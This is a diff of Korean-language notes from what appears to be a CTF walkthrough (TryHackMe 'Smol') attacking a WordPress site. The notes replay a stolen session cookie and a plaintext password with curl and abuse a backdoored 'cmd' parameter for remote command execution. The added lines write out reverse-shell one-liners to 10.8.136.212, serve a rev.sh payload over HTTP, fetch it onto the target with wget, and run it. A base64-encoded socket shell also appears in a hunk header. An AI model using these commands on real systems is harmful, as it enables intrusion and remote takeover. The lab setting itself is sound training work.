@@ -549,7 +549,7 @@ bash: dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW
 
 curl -L -H "Cookie: wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_45a7e4c82b517c5af328feabce4d0187=wpuser%7C1753668949%7CcPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv%7Cccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070" -H "User-Agent: Mozilla/5.0" http://www.smol.thm/wp-admin/profile.php?cmd=ls | bat -l html
 
-# 중간에 쉬다와서 다시 쿠키 탈취 필요
+# 중간에 쉬다와서 다시 쿠키 탈취 필요 (with burpsuite)
 
 # IP: 10.10.97.230
 
@@ -574,7 +574,89 @@ log=wpuser&pwd=kbLSF2Vop%23lw3rjDZ629\*Z%25G&rememberme=forever&wp-submit=Log+In
 
 curl -i -X POST "http://www.smol.thm/wp-login.php" -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0" --data "log=wpuser&pwd=kbLSF2Vop%23lw3rjDZ629\*Z%25G&rememberme=forever&wp-submit=Log+In&redirect_to=http://www.smol.thm/wp-admin/" -c cookie.txt
 
-┌──(root㉿docker-desktop)-[/]
-└─# curl -b cookie.txt -L http://www.smol.thm/wp-admin
-
 # 이제 RCE 취약점이 있는 위치 탐색하기
+
+curl -b cookie.txt -L http://www.smol.thm/wp-admin
+
+# 바로 발견! -> 플러그인을 wp 전역에서 사용하는 걸로 보임
+
+curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=ls
+
+about.php
+admin-ajax.php
+admin-footer.php
+admin-functions.php
+admin-header.php
+admin-post.php
+admin.php
+async-upload.php
+authorize-application.php
+comment.php
+contribute.php
+credits.php
+css
+custom-background.php
+custom-header.php
+customize.php
+edit-comments.php
+edit-form-advanced.php
+edit-form-blocks.php
+edit-form-comment.php
+edit-link-form.php
+edit-tag-form.php
+edit-tags.php
+edit.php
+erase-personal-data.php
+export-personal-data.php
+export.php
+freedoms.php
+images
+import.php
+includes
+index.php
+install-helper.php
+install.php
+js
+link-add.php
+link-manager.php
+link-parse-opml.php
+link.php
+load-scripts.php
+load-styles.php
+maint
+media-new.php
+media-upload.php
+media.php
+menu-header.php
+menu.php
+
+# reverse shell 연결
+
+curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=bash -i >& /dev/tcp/10.8.136.212/1234 0>&1
+
+2. **리버스 쉘 스크립트 작성**
+
+```bash
+echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.8.136.212/1234 0>&1'" > rev.sh
+```
+
+3. **공격자가 악성 스크립트 배포를 위한 서빙**
+
+```bash
+python3 -m http.server 6666
+```
+
+- 현재 디렉터리 파일을 6666 포트로 서비스함
+
+4. **타겟에서 스크립트 다운로드**
+
+```
+curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=wget http://10.8.136.212:6666/rev.sh -O /tmp/rev.sh
+curl -b cookie.txt -L http://www.smol.thm/wp-admin/index.php?cmd=chmod +x /tmp/rev.sh
+```
+
+5. **타겟에서 리버스 쉘 실행**
+
+```
+http://www.smol.thm/wp-admin/index.php?cmd=bash /tmp/rev.sh
+```
